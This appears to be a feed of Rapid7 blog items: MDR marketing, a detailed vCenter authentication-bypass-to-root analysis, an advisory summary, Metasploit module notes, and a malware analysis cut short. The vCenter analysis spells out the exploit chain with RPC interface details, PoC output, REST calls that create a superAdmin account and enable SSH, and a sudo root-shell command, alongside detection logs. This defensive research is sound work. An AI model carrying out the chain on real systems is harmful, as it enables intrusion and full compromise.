items.title: How to compare MDR providers when every proposal looks promising
items.summary:
Choosing a managed detection and response (MDR) provider means committing budget, connecting systems, and trusting another team to act when your organization is under pressure. Yet a proposal promising 24x7 coverage, expert analysts, and fast response can leave important questions unanswered. Which systems will actually be monitored? What will analysts investigate before contacting you? What happens when an incident needs more work?

Before choosing a provider or renewing your current agreement, ask for evidence of how the service operates. Rapid7’s MDR Evaluation Scorecard gives you 18 checks to structure that conversation and record what still needs proving.

Start with one investigation

Ask a provider to walk you through a completed investigation, using an anonymized example where necessary. Follow the initial signal through the evidence considered, the analyst’s decision, and any response actions.

Suppose suspicious activity involves an account with access to a critical business system. Can the provider show how the account’s permissions, the systems within reach, and known weaknesses influenced its investigation? Can it explain what it ruled out and why it escalated or contained the activity?

This exercise helps you assess whether exposure context, intelligence, and customer telemetry work together. It also makes the division of work visible: what the provider investigated, what it decided, and what your team had to do next.

Compare the service you would actually receive

Use the same requirements for every provider, including your incumbent. Confirm the proposed service tier, supported integrations, response responsibilities, and total costs before comparing scores.

Be specific about incident response. Establish who handles containment, forensics, eradication, and mitigation, which actions require your approval, and whether additional work changes the bill. A demonstration should be supported by written commitments about the service you would receive.

Rapid7 MDR includes unlimited incident response, giving customers direct access to senior responders for digital forensics, eradication, and mitigation. When evaluating that commitment, ask us to explain the activities covered, how containment and remediation are coordinated, and which decisions remain with your team.

Apply the same scrutiny to intelligence. Ask for an example showing how an emerging threat led to detection updates, hunting activity, or customer guidance. Rapid7’s emerging-threat response process connects research, detection engineering, product, and communications. The useful evaluation question is how that process changes the protection and advice customers receive.

Look for improvement you can trace

A detailed investigation record helps you understand what happened. Your next question should be what changed afterward.

Look for recommendations that led to stronger controls, better detections, or closed coverage gaps. Ask how the provider reviews completed actions and recurring problems with your team. When comparing reporting, check whether you can trace those improvements alongside investigation volumes and response measures.

Turn the answers into a decision

The scorecard covers six areas: exposure-aware detection, intelligence, response ownership and cost, transparency, team expertise, and integration. Rate each capability against evidence, then record limitations, outstanding questions, and follow-up owners.

The total helps organize your comparison, but essential requirements deserve individual attention. A strong overall score cannot compensate for a response capability your organization needs and the proposed service excludes.

Download the MDR Evaluation Scorecard before your next provider review, shortlist meeting, or renewal discussion. Use it to make the evidence comparable and identify exactly what needs resolving before you commit.

items.title: Rapid7 Analysis: VMware vCenter SRP Authentication Bypass to Root (CVE-2026-123890)
items.summary:
Overview

An unauthenticated attacker can retrieve the session key for an in-progress administrator login to VMware vCenter's directory service. The attacker then uses that key to complete the login without knowing the account's password. The vulnerable interface is exposed through DCE/RPC on TCP port 2012.

The issue, tracked as CVE-2026-123890, combines a Secure Remote Password (SRP) session-key getter that is callable before authentication with an RPC context lookup that does not enforce ownership. The context handles use predictable UUIDv1 values. By creating two reference contexts around a pending login, an attacker can narrow the hidden login handle to a short timestamp window and ask the server for its key.

We reproduced the bypass against vCenter Server Appliance 8.0.2.00400, build 23929136, running Photon OS 4.0, and leveraged the resulting administrator connection through to root command execution. SSH and Bash access were initially disabled. The attack recovered the directory database and its Security Token Service (STS) signing key, forged an administrator API session, and used appliance administration features to create an account and enable SSH. Neither the existing SSO password nor the root password was an input to that chain.

Impact

The attacker needs network access to TCP 2012 and the name of an existing SSO principal. Our PoC uses the default SSO administrator principal, administrator@vsphere.local; deployments using a different SSO domain need the corresponding account name. The attack does not depend on an existing authenticated connection or an administrator being online. The attacker initiates the login attempt in order to recover its session key.

The authenticated connection can call the directory database-copy interface. Its raw database contains the STS private signing key, allowing the attacker to sign administrator assertions that vCenter trusts. Our attack workflow used a forged assertion to create a local appliance superAdmin account, enable SSH and Bash, and execute commands as root through sudo. This final part requires access to the HTTPS API on TCP 443 and SSH on TCP 22, in addition to TCP 2012. It uses the administrative privileges obtained through the original bypass; no second vulnerability is needed once you have administrative RPC access.

Technical Analysis

Returning the key before checking the proof

// vmdir/server/vmdir/rpcsrpserv.c

 long Srv_rpc_srp_verifier_get_session_key(
 handle_t hServer,
 srp_verifier_handle_t hSrp,
 rpc_p_srp_bytes_container ret_key_cont)
 {
// ...
 struct SRPVerifier ver = (struct SRPVerifier *) hSrp; //[A1]
 rpc_p_srp_bytes_container key_cont = NULL;
if (!ver)
{
    sts = rpc_s_invalid_handle;
    goto error;
}
key = srp_verifier_get_session_key(ver, &key_len);     // [A2]
if (!key || key_len == 0)
{
    sts = rpc_s_auth_nokey;
    goto error;
}
sts = _srp_bytes_container_allocate(key, key_len, &key_cont);
if (sts)
{
    goto error;
}
*ret_key_cont = key_cont;                             // [A3]
// ...
}

The SRP RPC getter receives an SRP verifier at [A1], obtains its session key at [A2], and returns a copy at [A3]. It checks whether the verifier and key exist. It does not check whether the caller has authenticated, whether the caller owns the verifier, or whether the SRP client has supplied a valid password proof.

The value at [A1] is a server-side pointer that the RPC runtime resolves from the context handle supplied in the request. Each newly created verifier context receives its own UUID, so the attacker needs the handle for the specific pending login they want to complete. These context UUIDs identify individual verifier instances; the fixed interface UUIDs identify the available RPC interfaces.

UUIDv1 values contain a timestamp, clock sequence, and node identifier. The attacker creates a verifier immediately before starting the target login and another immediately afterward, obtaining both reference UUIDs without authenticating. On the tested service, the reference UUIDs share their clock sequence and node identifier. The attacker reuses those fields and searches the intervening timestamps for the pending login's live verifier, keeping the login connection open throughout the search.

// vmdir/thirdparty/csrp/srp.c 
int srp_verifier_is_authenticated(struct SRPVerifier *ver)
{
    return ver->authenticated; // [A4]
}
// ...
const unsigned char *srp_verifier_get_session_key(
    struct SRPVerifier *ver, int *key_length)
{
    if (key_length)
        *key_length = hash_length(ver->hash_alg);
    return ver->session_key; // [A5]
}

The underlying SRP library exposes the authentication flag separately at [A4]. Its key getter at [A5] does not consult that flag. The server has already computed the shared key while generating its challenge, because it needs that key to verify the client's proof. Returning it at this stage gives the client the secret needed to produce that proof.

Resolving another connection's context

// dcerpc/idl_lib/ctxeectx.c
void rpc_ss_ee_ctx_from_wire(
    ndr_context_handle *p_wire_context,
    rpc_ss_context_t *p_context,
    volatile error_status_t *p_st)
{
    // ...
    p_uuid = &p_wire_context->context_handle_uuid; // [B1]
    // ... nil-handle check and table lock ...
    this_link = &context_table[dce_uuid_hash(p_uuid,
        (error_status_t *)p_st) % CALLEE_CONTEXT_TABLE_SIZE]; // [B2] 
    while (!dce_uuid_equal(p_uuid, &this_link->uuid,
        (error_status_t *)p_st))
    {
        this_link = this_link->next_context;
        // ... reject a missing entry ...
    }
    *p_context = this_link->user_context; /* [B3] */
    // ...
}

The RPC runtime takes the supplied UUID at [B1], searches a process-wide table at [B2], and returns the associated context at [B3]. There is no comparison with the requesting connection or its authenticated identity. Although context creation records a client for lifetime management, that client is not part of this lookup's authorization decision (hooray!!).

We confirmed the boundary directly: one anonymous RPC connection created an SRP verifier, and a second anonymous connection retrieved that verifier's key before any password proof was sent. The first connection's context handle was enough to make the second connection's request succeed.

The service registers the helper with a secure-interface flag and an authentication callback. On the tested TCP path, however, the RPC executor retrieves those registration values and dispatches the server stub without enforcing the callback. Other directory handlers perform their own access checks. The SRP key getter has no equivalent check, leaving it reachable before authentication.

Predictable handles make the lookup usable

// dcerpc/uuid/uuidsys.c
void uuid__get_os_time(dce_uuid_time_t *uuid_time)
{
    // ...
    if (gettimeofday(&tp, (struct timezone *)0))           // [C1]
    {
        perror("uuid__get_os_time");
        exit(-1);
    }
    uuid__uemul((long)tp.tv_sec, UUID_C_100NS_PER_SEC, &utc);
    uuid__uemul((long)tp.tv_usec, UUID_C_100NS_PER_USEC, &usecs); // [C2]
    UADD_UVLW_2_UVLW(&usecs, &utc, &utc);
    // ... add the UUID epoch offset ...

The UUID timestamp generator reads the wall clock at [C1] and converts its microseconds into 100-nanosecond UUID ticks at [C2]. The resulting UUIDv1 handle also contains a clock sequence and node identifier. In our captures, those latter fields remain stable while newly created contexts advance through the timestamp space.

vmdir manages this SRP authentication exchange through the Generic Security Service API (GSS-API), which provides a common interface for authentication mechanisms. Starting the login creates an SRP verifier internally, but the login client does not receive its context handle.

An attacker can obtain reference handles by creating ordinary SRP verifiers through the helper interface. Creating one immediately before the GSS-API login and another immediately afterward bounds the timestamp of its hidden verifier. The shared node and clock-sequence fields then let the attacker construct candidate UUIDs within that interval.

The default search advances in increments of ten UUID ticks, matching the clock's microsecond resolution. The generator also supports uniqueness adjustments within a clock tick, so the PoC includes a one-tick search mode. Clock changes, concurrent activity, and the chosen search bounds can affect recovery; exhausting the window does not establish that a target is patched.

Exploit

Narrowing the Search Window for a Pending Login

The service exposes two relevant RPC interfaces on port 2012:

Interface

UUID

Operations used

SRP verifier helper

c7e94609-6ab0-4767-8e92-b6485bff1649

Create verifier, retrieve key, delete verifier

vmdirdbcp

72c780fe-af6b-42ba-9b02-f61f4ccc98ed

SRP-authenticated bind, directory state, and database open/read/close

The helper's operation numbers are 0 for verifier creation, 1 for key retrieval, and 4 for deletion. GetState is operation 4 on the separate vmdirdbcp interface. The interface UUID is therefore part of identifying an operation; the operation number alone is ambiguous.

The client first creates a reference verifier, starts a separate SRP login as the target principal (e.g. administrator@vsphere.local), and creates the second reference verifier. It keeps the login connection open while querying candidate handles over another anonymous connection. These are all connections controlled by the attacker.

GSS does not return the handle for its own verifier. A reference verifier for the same principal has a different session key, so retrieving that reference key does not complete the pending GSS login. We need the key from the verifier associated with the login connection; the reference handles only narrow the search for it.

In the final standalone PoC test, the reference handles were:

Before: 1d98c67a-e468-11f1-b101-000c29451b35
Hidden: 1d99c43a-e468-11f1-b101-000c29451b35
After:  1d9a8a14-e468-11f1-b101-000c29451b35

The interval between the reference timestamps was 115,610 UUID ticks, or about 11.56 milliseconds. The search recovered the hidden handle shown above after 5,083 queries. Four workers issued the queries in that Python test, so the count includes requests that were already in flight when the match was found.

The SRP verifier helper returns the pending login's actual 20-byte session key. The attack does not need a weak password, a password hash from disk, or an invalid SRP public value. 

Completing SRP with the disclosed key

M1   = SHA1((SHA1(N) XOR SHA1(g)) || SHA1(I) || s || A || B || K)
HAMK = SHA1(A || M1 || K)

Here, I is the requested principal, N and g are the SRP group parameters, s is the server's salt, and A and B are the public values exchanged during login. The server sends s alongside B in its initial SRP challenge, before the client supplies a password proof. The salt is public: a legitimate client uses it with the password to derive the values needed for authentication.

The client already has all of these inputs except K. Once the key getter supplies K, the client can calculate the normal client proof, M1, and verify the server's response, HAMK.

The attack does not need a weak password, a password hash from disk, or an invalid SRP public value. Our client uses the valid public value A = 2 in the normal 2048-bit group. The reference verifiers use the cheaper 1024-bit group only to obtain the timing bounds.

The implementation hashes minimal big-endian integer representations. On the tested build, the returned B is 276 bytes because CSRP serializes k*v + g^b without first reducing the sum modulo N. Reducing or truncating that returned value while building the transcript produces the wrong proof.

The successful mechanism on this build is the legacy SRP OID 1.2.840.113554.1.2.10. Its token framing also differs from a conventional GSS wrapper: the outer length covers the OID, with the SRP state token following it. The client carries the exchange in SPNEGO bind and ALTER_CONTEXT messages, using RPC packet privacy. Matching that framing is necessary to reach the vulnerable authentication flow.

Proving the authenticated connection

The client derives packet-protection keys from the recovered SRP key using the server's normal implementation. PBKDF2-HMAC-SHA1 expands the key into 64 bytes using the principal as salt and 128 iterations. Those bytes supply an IV, material for the Kerberos AES-256 string-to-key operation, and a 16-byte HMAC key. RPC stubs are encrypted with AES-CBC and authenticated with HMAC-SHA1 over the ciphertext.

PoC output:

{"time": "2026-11-19T22:25:25.919835+00:00", "event": "session_key_disclosed", "uuid": "1d99c43a-e468-11f1-b101-000c29451b35", "key": "1f1476617a050b8e30388e0f58ed80d83f01aa02", "guesses": 5083, "seconds": 0.8774298130301759}
{"time": "2026-11-19T22:25:25.952425+00:00", "event": "srp_authentication_complete", "username": "administrator@vsphere.local", "M1": "af03ad96cb799381bf8e9a30a412b4371e24729d", "HAMK": "537b2d5753f213304824551077bddd51ed6693ae", "password_supplied": false}
{"time": "2026-11-19T22:25:26.226964+00:00", "event": "protected_rpc_result", "operation": "RpcVmDirGetState", "state": 3, "status": 0, "plaintext": "0300000000000000"}

We used RpcVmDirGetState to test the resulting connection to 192.168.1.81. An anonymous request returned status 5, ACCESS_DENIED. The authenticated request above returned 0300000000000000: the little-endian directory state, 3 (Normal), followed by the operation's success status, 0. The PoC checked the server's SRP proof and the encrypted response's MAC before accepting the result.

Key recovery took approximately 0.88 seconds in this run. The complete test retained the original RPC traffic and a packet capture with 15,343 packets and zero kernel drops.
This brings us to the end of exploiting CVE-2026-123890. We have demonstrated how we can authenticate to VMware vCenter's directory service as the administrator user and will now outline how that access can be used to get root access to the device. 

Reading the directory database

vmdir/server/vmdir/rpcserv.c, Srv_RpcVmDirOpenDatabaseFile:

// vmdir/server/vmdir/rpcserv.c
UINT32 Srv_RpcVmDirOpenDatabaseFile(
    handle_t hBinding,
    PWSTR pwszDBFileName,
    vmdir_dbcp_handle_t *ppFileHandle)
{
    // ...
    DWORD dwRpcFlags = VMDIR_RPC_FLAG_ALLOW_TCPIP
                       | VMDIR_RPC_FLAG_REQUIRE_AUTH_TCPIP
                       | VMDIR_RPC_FLAG_REQUIRE_AUTHZ;
    // ...
    dwError = _VmDirRPCCheckAccess(hBinding, dwRpcFlags,
        pszDomainDn, &pAccessToken);                      // [D1]
    BAIL_ON_VMDIR_ERROR(dwError);
    // ... validate arguments and convert the filename ...
    dwError = _VmDirRemoteDBCopyWhiteList(pszDBFileName);  // [D2]
    BAIL_ON_VMDIR_ERROR(dwError);
    // ...
    if ((pFileHandle = fopen(pszDBFileName, "rb")) == NULL)
    {
        // ... report the open failure and take the error path ...
    }
    *ppFileHandle = pFileHandle;                          // [D3]
    // ...

The database-copy handler requires authentication and authorization at [D1]. The earlier bypass satisfies those checks as the SSO administrator. The filename passes a database-path allowlist at [D2], and the handler returns a file context at [D3]. We requested /storage/db/vmware-vmdir/data.mdb through that interface.

The IDL assigns operation 0 to open, 1 to read, and 2 to close. The open request carries a reference wide string and an initially empty context handle. Each read supplies the returned context, a byte count, and an empty output container. Reads continue until the server returns a zero byte count.

Our first complete export contained 16.22 MB. We used 2,048-byte reads so the response, encryption padding, and verifier fit into a single RPC fragment. The directory stayed in state 3, Normal; we did not call RpcVmDirSetBackendState or take the service offline. These calls copy the live file rather than producing a transaction-consistent backup. The downloaded file contained the signing credential needed for the next step.

Signing an administrator API assertion

The TenantCredential-1 record in data.mdb contains the STS RSA private key and its certificate chain. Metasploit already provides extraction and SAML-signing code in vcenter_offline_mdb_extract and vcenter_forge_saml_token. We reused those implementations, matched the signing certificate to the recovered private key, and verified its VMCA issuer.

The signed assertion identifies administrator@vsphere.local and carries the existing template's administrator group claims, including SystemConfiguration.Administrators. The issuer uses the appliance's STS identity, and the assertion includes a short validity window. Once the XML is signed, changing its whitespace can invalidate the digest, so the client preserves its compact serialization.

lib/msf/core/exploit/remote/http/vmware_vcenter.rb, API login:

token = Base64.strict_encode64(Zlib.gzip(assertion))        # [E1]
response = vcenter_api_request(
  'POST', %w[com vmware cis session], port: port, host: host,
  headers: { 'Authorization' => "SIGN token=\"#{token}\"" }
)
session_id = vcenter_api_value(response)                   # [E2]

The client gzip-compresses and Base64-encodes the assertion at [E1], following the vendor REST SDK's SAML login example. A successful POST /rest/com/vmware/cis/session returns the API session ID at [E2]. Subsequent requests carry it in the vmware-api-session-id header. Our forged assertion returned HTTP 200 and authorized reads of the appliance's SSH and Bash settings.

From the appliance API to root

The authenticated API session gives us a way to create credentials that SSH will accept. We created a fresh local account through the appliance local-accounts API, assigning the superAdmin role. This is an operating-system account on the appliance; creating it does not require changing an existing account's password.

The tested build accepts the account-creation request through the legacy REST route POST /rest/appliance/local-accounts/<username>, with its configuration inside a config object. The configuration supplies the generated password, roles: ["superAdmin"], and enabled: true. The same API session enables SSH with PUT /rest/appliance/access/ssh and {"enabled":true}, then enables Bash with PUT /rest/appliance/access/shell and {"config":{"enabled":true,"timeout":600}}.

/etc/sudoers.d/applmgmt on the tested appliance:

%superAdmin ALL= PASSWD: ALL, NOPASSWD: OPERATOR_N, ADMINISTRATOR_N

That sudo rule allows the new account to run commands as root using its own generated password. An SSH login initially enters the appliance CLI, so the client requests a PTY and starts shell /bin/bash. After answering the appliance's sudo password prompt, it starts sudo -n /bin/bash -i on the same terminal. The sudo timestamp from that authentication permits the retained root shell.

We verified uid=0(root) gid=0(root) groups=0(root),4044(shellaccess) through the resulting SSH connection. This account and password were created by the forged API session; the supplied lab root credentials were used separately for inspection and were not used to obtain this shell.
Using the sessions in Metasploit

[*] 192.168.1.81:2012 - Recovered the pending session key after 17337 guesses in 8.12 seconds
[*] 192.168.1.81:2012 - Recovered context 688f5878-e487-11f1-b101-000c29451b35, key f56a33e23fad8b8d340c8ca0887aebe1fb793bab
[+] 192.168.1.81:2012 - Authenticated as administrator@vsphere.local without a password; protected directory state: 3
[+] 192.168.1.81:2012 - Saved authentication evidence to /Users/jheysel/codex_research/vsphere_armory_castle_20261119/metasploit/config/loot/20261119190933_default_192.168.1.81_vmware.vmdir.srp_059381.json
[*] VMware directory RPC session 3 opened (192.168.1.70:61547 -> 192.168.1.81:2012) at 2026-11-19 19:09:34 -0700
[*] 192.168.1.81:2012 - Interacting with vmdir session 3; use background to return to msfconsole
vmdir > whoami
Authenticated SSO principal: administrator@vsphere.local
vmdir > state
Directory state: 3
vmdir > state
Directory state: 3

The Metasploit module separates the inexpensive key-disclosure check from the full authentication attempt. check creates an owned verifier and asks for its key through a second anonymous association. run then performs the pending-login search, completes SRP, and verifies the protected operation.

The module's default RPC action retains the authenticated association and exposes a vmdir > prompt with state and whoami commands. Selecting ACTION SHELL continues through database export, SAML API authentication, and SSH to a root command shell. The fresh end-to-end test produced the following output:

[+] 192.168.1.81:2012 - Root execution verified: uid=0(root) gid=0(root) groups=0(root),4044(shellaccess)
[*] Command shell session 1 opened (192.168.1.70:62059 -> 192.168.1.81:22) at 2026-11-20 07:48:25 -0700
...
[*] 192.168.1.81:2012 - Interacting with shell session 1; use background to return to msfconsole
...
root [ /home/sebastian-fritsch ]# id
uid=0(root) gid=0(root) groups=0(root),4044(shellaccess)

CreateSession defaults to true for either action. We resumed the root shell and ran id to show root access before exiting. 

The shell action saves the generated account credentials and original SSH/Bash settings before changing the appliance. It retains the temporary account and access settings while the session is open. On exit, it closes SSH, restores the original settings, and deletes its account through the API. The order matters: the appliance refuses to delete an account that still has running processes, and disabling SSH terminates active connections. Closing the console abruptly can prevent cleanup; the saved recovery details identify the account and settings to restore.

Detection opportunities

The unauthenticated key queries are visible before the client establishes packet privacy. Useful network evidence includes repeated calls to operation 1 on the SRP helper interface, with no RPC authentication verifier and context UUIDs that differ mainly in their timestamp fields. In our reproduction, those queries occur between the pending login's initial bind and its SRP proof continuation.

The helper interface UUID, operation number, authentication state, query volume, and UUID pattern are useful together. A connection to port 2012 or an administrator SRP login on its own does not establish exploitation.

The appliance also retains evidence of the database export and subsequent administration. We recovered the following records from the same vCenter 8.0.2.00400 appliance after the test accounts had been removed.

/var/log/vmware/vmdird/vmdird-syslog.log:

2026-11-20T14:45:46.792144+00:00 info vmdird  t@140450245629504: Remote DB transfer (/storage/db/vmware-vmdir/data.mdb) granted.


The directory service records this message when its filename allowlist grants a remote database-copy request. It identifies the requested database, but does not include the caller's address or prove that the transfer completed. An unexpected grant for data.mdb provides a timestamp to correlate with network traffic and the later API activity; legitimate directory replication can also use this interface. The SRP bypass can occur without a database-copy request, so this entry identifies the export stage.

/var/log/vmware/vapi/endpoint/endpoint-access.log:

2026-11-20T14:48:08.065Z | vAPI-I/O dispatcher-0     | e97ae44e-a503-4b58-9b68-1168c80e89c6 | 192.168.1.70 - - [20/Nov/2026:14:48:07 +0000] "POST /rest/appliance/local-accounts/sebastian-fritsch HTTP/1.1" 200 0 "-" "Mozilla/5.0 (iPad; CPU OS 17_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1" 233

The API access log records the source address, request path, status, and user-agent. This request creates the account used by the root-shell stage. The same file contains our POST /rest/com/vmware/cis/session, PUT /rest/appliance/access/ssh, PUT /rest/appliance/access/shell, and eventual account-deletion requests. An HTTP 200 on a settings request does not reveal which value was applied, so the appliance management log supplies the next part of the sequence.

/var/log/vmware/applmgmt/applmgmt.log:

2026-11-20T14:48:07 PM UTC [47843]INFO:vmware.appliance.localaccounts.localaccounts_impl:Administrator@VSPHERE.LOCAL created the local account user sebastian-fritsch
2026-11-20T14:48:09 PM UTC [47843]DEBUG:root:com.vmware.appliance.version1.access.ssh.set(enable=True)
2026-11-20T14:48:10 PM UTC [47843]DEBUG:root:com.vmware.appliance.version1.access.shell.set(config=Structure('ShellConfig', dict(enabled=True, timeout=600)))
2026-11-20T14:49:34 PM UTC [47843]INFO:vmware.appliance.localaccounts.localaccounts_impl:Administrator@VSPHERE.LOCAL deleted the local account  user sebastian-fritsch.

These records identify Administrator@VSPHERE.LOCAL as the account creator and show SSH and Bash being enabled. The configuration values appear in DEBUG-level records on the tested appliance; the account creation and deletion records are INFO-level. The forged SAML session is treated as an administrator session, so that identity alone does not distinguish it from legitimate administration.

/var/log/audit/sshinfo.log.1.gz, decompressed:

2026-11-20T14:48:12.368544+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 sshd[592859]: Accepted password for sebastian-fritsch from 192.168.1.70 port 62059 ssh2
2026-11-20T14:48:17.298091+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 sudo: sebastian-fritsch : TTY=pts/0 ; PWD=/home/sebastian-fritsch ; USER=root ; COMMAND=/bin/bash -i
2026-11-20T14:49:34.208901+00:00 node-1w7jr9qrllzwd9vncrrr8zlf9 userdel[593806]: delete user 'sebastian-fritsch'


The SSH and sudo records tie the new account to the API client's address and a root Bash shell. They also retain the deletion performed during cleanup. Search sshinfo.log and its rotated copies; these entries had moved into sshinfo.log.1.gz by the time we collected them. Matching records are also available through the system journal.

/var/log/audit/audit.log:

type=EXECVE msg=audit(1795186087.886:3732): argc=6 a0="/usr/sbin/useradd" a1="-m" a2="-G" a3="superAdmin" a4="--" a5="sebastian-fritsch"
type=EXECVE msg=audit(1795186097.286:3767): argc=4 a0="sudo" a1="-n" a2="/bin/bash" a3="-i"


Linux audit records preserve the command arguments for adding the user to superAdmin and invoking sudo -n /bin/bash -i. These examples come from a rotated audit log. They remain available after the account and its home directory are removed, subject to log retention.

For this reproduced path, correlate an unexpected database-transfer grant with creation of a local administrator, SSH/Bash enablement, and an SSH login followed by sudo. The database-copy grant appears at 14:45:46 UTC, account creation at 14:48:07, and the root-shell command at 14:48:17. These are administrative operations that can occur legitimately; their sequence and whether they fit expected activity determine their value as indicators. The account name, source address, user-agent, UUIDs, and session values shown here belong to our lab run and are not fixed attacker identifiers.

Mitigation

Broadcom identifies vCenter 8.0 U3m as the fixed release for the 8.0 branch in VMSA-2026-0009 and its accompanying FAQ. Other release branches have their own guidance. Apply the vendor's supported update for the deployed product and keep the directory-service management interfaces reachable only by the systems that need them.

The failed boundary spans both the SRP helper and the RPC runtime: a pending authentication key is exposed, and a connection can resolve a context that it does not own. Replacing predictable UUIDs alone leaves that ownership problem in place. We did not compare the vendor's fixed binaries, so this analysis does not attribute a particular code change to the patch.

items.summary:
This release we have three pull requests from jburgess-r7 building out coverage for the identity-boundary issues detailed in Rapid7's Breaking Zimbra Identity Boundaries, Part One research.

First up is a new shared mixin, Msf::Exploit::Remote::HTTP::Zimbra, which gives every current and future Zimbra module a common foundation for account/admin SOAP authentication, canonical identity resolution, mailbox-server lookup, and version parsing, allowing future modules to stay focused on the vulnerability instead of re-implementing Zimbra's SOAP plumbing.

Built on top of that mixin are two new modules targeting CVEs from the same research track:

CVE-2026-73571 (#22080) It's an authorization bypass in Zimbra's SaveDraftRequest handling that lets an ordinary authenticated user send mail as another local mailbox without a delegation grant, landing a message in the victim's own Sent folder in the process.

CVE-2026-93637 (#22070) Is a rate-limit bypass in Zimbra's Network Edition GraphQL authentication endpoint, which lets credential-stuffing attempts skip the source-IP lockout counter that normally protects the SOAP login path.

items.summary:
Overview

On November 19, 2026, Broadcom published VMware Security Advisory VMSA-2026-0009, addressing five vulnerabilities in VMware products. The most severe of these, CVE-2026-123890, is an authentication bypass using an alternate path or channel (CWE-288) in the VMware Directory Service component of vCenter. Broadcom assigned the vulnerability a critical CVSSv3 score of 9.8.

A malicious actor with network access to an affected vCenter deployment may exploit CVE-2026-123890 without credentials to bypass authentication and gain unauthorized access to the system as the Administrator user. Mandiant privately reported the issue to Broadcom. Also, Mandiant/Google Threat Intelligence confirmed in-the-wild exploitation of CVE-2026-123890 by Chinese state-linked threat actor ARMORY CASTLE as early as September 2026.

CVE-2026-123890 is distinct from the vCenter authentication bypass vulnerability CVE-2026-59309 that Broadcom addressed earlier in 2026. The vendor FAQ states that all vCenter systems below the versions fixed by VMSA-2026-0009 require the new update, including systems that already received the earlier fix. Broadcom characterizes the vCenter update as an emergency change requiring prompt action.

On November 20, 2026, the U.S. Cybersecurity and Infrastructure Security Agency (CISA) added CVE-2026-123890 to its Known Exploited Vulnerabilities (KEV) catalog, based on evidence of active exploitation.

Mitigation guidance

Vendor-provided updates are available for CVE-2026-123890. Broadcom lists no workaround, and the patches cannot be applied using vCenter Quick Patch. Organizations should prioritize upgrading vCenter on an emergency basis, outside of normal patch cycles, using the standard update mechanism for their deployment.

items.title: What Is Preemptive MDR? A Guide For Security Leaders
items.summary:
When an MDR provider contains a compromised endpoint, your team needs to know whether the weakness that enabled the attack exists elsewhere and who is responsible for addressing it. Without that follow-through, the immediate incident may be resolved while another attacker still has a way in.

Preemptive managed detection and response (MDR) is Rapid7's approach to connecting exposure context, threat intelligence, AI-assisted investigation, and human expertise. It supports proactive cybersecurity by helping teams prioritize weaknesses before exploitation, investigate threats with a clearer understanding of risk, and use their findings to strengthen defenses.

How does preemptive MDR differ from traditional MDR?

Managed detection and response provides security specialists who monitor, investigate, and respond to threats around the clock. Many services also include proactive threat hunting and recommendations to improve security.

Preemptive MDR connects that work more directly to what makes an organization vulnerable. When analysts investigate suspicious activity on a server, knowing that it is internet-facing, supports a critical application, and has a vulnerability under active exploitation helps them assess urgency and determine where to look next.

In Rapid7’s model, exposure findings inform investigation and remediation priorities, while investigations reveal weaknesses that need attention. Security leaders gain a clearer connection between the threats their provider handles and the conditions their organization needs to address.

Within a broader preemptive cybersecurity strategy, MDR connects exposure information with the people investigating and responding to threats. The aim is to reduce opportunities for compromise and intervene before an attack causes harm, while retaining the expertise to contain and recover from incidents.

How exposure context and proactive threat hunting inform MDR

By combining information about assets, vulnerabilities, business criticality, and attacker behavior, preemptive MDR helps teams decide which weaknesses require action first. Exposure context also informs targeted hunting and the investigation of suspicious activity.

Consider a hypothetical organization running an internet-facing application affected by a newly disclosed vulnerability. The security team needs to establish whether the vulnerable software is present, what the application supports, and whether attackers are exploiting the weakness.

Those findings can guide remediation priorities and targeted hunting for signs of compromise. If suspicious activity appears, analysts investigate it with an understanding of the affected system and the potential route an attacker could take through the environment.

Depending on the evidence, the response may involve containing a system, examining related accounts, or expanding the investigation to other assets. The organization’s remediation teams also need clear recommendations about the underlying exposure.

What the investigation reveals then feeds back into detection rules, hunting priorities, and response procedures. This gives leaders a way to track an identified risk through investigation, action, and outstanding work, with clearer ownership at each stage.

What role does AI play in preemptive MDR?

Before analysts can assess a potential threat, they often need to retrieve logs, examine user activity, and connect evidence across several systems. AI can accelerate this work by gathering and correlating information for review.

Agentic investigation capabilities can perform elements of that process in parallel, test possible explanations, and organize findings. Their usefulness depends on the available data: missing identity activity or asset information can leave gaps in the account of what happened.

Rapid7’s approach keeps human expertise central to validation and response decisions. Analysts assess the evidence alongside the organization’s priorities and the consequences of an action, including whether isolating a system could interrupt a critical service.

What to look for in a preemptive MDR provider

When evaluating a service described as preemptive, ask the provider to show how exposure information changes its work. A redacted investigation should make clear what analysts knew about the affected asset, how that influenced their reasoning, and which actions followed.If an investigation identified a weakness, was it assigned to an owner and addressed? Did the findings change detection coverage or future priorities? Where AI contributed, the provider should explain its role and the oversight applied.

Incident response remains part of the requirement. Rapid7 MDR includes unlimited incident response alongside exposure-informed defense and AI-assisted investigation, supporting containment, detailed analysis, and threat eradication.

Agree on responsibilities before that support is needed. Establish which actions the provider can take, when customer approval is required, and who owns remediation. Those arrangements determine how findings become action, particularly when taking a system offline carries business consequences.

Once the service is operating, review progress through specific cases: exposures addressed before exploitation, threats contained, and weaknesses closed after investigation. Ask to see the evidence behind those outcomes and any work still outstanding, so your team can judge where risk has changed and where further attention is needed.

Explore Rapid7 MDR to see how exposure-informed defense, AI-assisted investigation, and expert response work together.

items.title: Spying on Governments with Zero Lines of Malware: A Custom SoftEther Bridge in Webworm’s Toolkit
items.summary:
Introduction

For a threat actor, the perfect malware is one they don’t have to write, and already does all they need. One example of this is shown by the China-aligned APT known as Webworm, which has been known to deploy the open-source SoftEther VPN into the networks of compromised governmental organizations to maintain low-profile, long-term access.

After this was publicly documented and defenders could keep an eye out for this tactic, the actor presumably started thinking of ways to make their covert access stealthier. In this post, we share our analysis of what we believe to be a so-far unknown custom SoftEther-based tool, which implements various tricks to hide itself from security tools, and which we attribute to Webworm with moderate confidence. We additionally provide guidance and tooling for detecting its presence on a system and extracting the configuration(s) associated with it.

Technical analysis

To illustrate how the tool works, we will use the only public sample of this tool we are aware of, which can be found in our IoCs list (90e7…).

The sample is a Windows PE32+ file targeting the x64 architecture. Based on cleartext strings and constants in the binary, we identified it as a (modified) build of the SoftEther VPN Bridge executable, specifically version 4.44, build 9807. Similarly, the PDB path included in the executable reads C:\Users\Administrator\Desktop\SoftEtherVPN_Stable\SoftEtherVPN_Stable\SoftEtherVPN_Stable\src\DebugFiles\pdb\x64_Release\vpnbridge.pdb. As such, the tool doesn’t hide its identity from reverse engineers, only external interactions.

